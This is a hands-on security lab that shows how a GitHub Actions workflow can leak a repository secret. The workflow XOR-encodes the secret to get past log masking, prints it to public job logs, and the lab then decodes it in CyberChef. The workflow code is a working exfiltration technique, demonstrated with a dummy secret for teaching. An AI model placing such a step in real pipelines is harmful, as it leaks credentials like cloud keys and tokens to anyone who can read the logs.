# Using public logs to exfiltrate secrets

This lab will simulate how an attacker could use GitHub Actions to exfiltrate secrets via public logs.

---

## Prerequisites

Before you begin, make sure you have the following:

- **A GitHub account** (with permission to create private repositories).
- **A browser** to:
  - Access [https://github.com](https://github.com)


## Step 1: Create a new GitHub repository

Go to GitHub and create a new public or private repository named something like `public-logs-exfiltration-demo`.

## Step 2: Add a GitHub Actions workflow

Create the file `.github/workflows/leak.yml` and add following contents to it:

```yaml
name: XOR Secret Leak

on: push

jobs:
  xor_secret:
    runs-on: ubuntu-latest
    env:
      SECRET: ${{ secrets.MY_SECRET }}
    steps:
      - name: XOR the secret and print
        run: |
          KEY="A"  # simple 1-char XOR key
          xor() {
            local input="$1"
            local key="$2"
            local output=""
            for (( i=0; i<${#input}; i++ )); do
              char="${input:$i:1}"
              xor_char=$(printf '%d' "'$char")
              xor_key=$(printf '%d' "'$key")
              result=$(( xor_char ^ xor_key ))
              output+=$(printf '\\x%02x' "$result")
            done
            echo -e "$output"
          }

          echo "XOR'd secret:"
          xor "$SECRET" "$KEY"
```
## Step 3: Add a secret

Go to your GitHub repo > Settings > Secrets and Variables > Actions, and add:

- Name: `MY_SECRET`
- Value: `super-secret-token-123`

## Step 4: Add a dummy file to the repository to trigger a commit and push

## Step 5: Retrieve the exfiltrated secret

 - Go to Actions -> All workflows -> leak.yml
 - In the leak.yml section click on xor_secret
 - Expand XOR the secret and print
 - Copy the value shown below `XOR'd secret:`
 - Go to [Cyber Chef](https://gchq.github.io/CyberChef/)
 - Search for XOR operation
 - Drag and drop it to the Recipie section
 - Paste the copied value in Input section
 - In the Recipie section select UTF-8 from the drop-down
 - Enter A in the Key field
 - The Output section will display the deciphered value of the exfiltrated secret

In a real-world scenario, this secret could be an AWS key, a GitHub token, or a cloud API key.
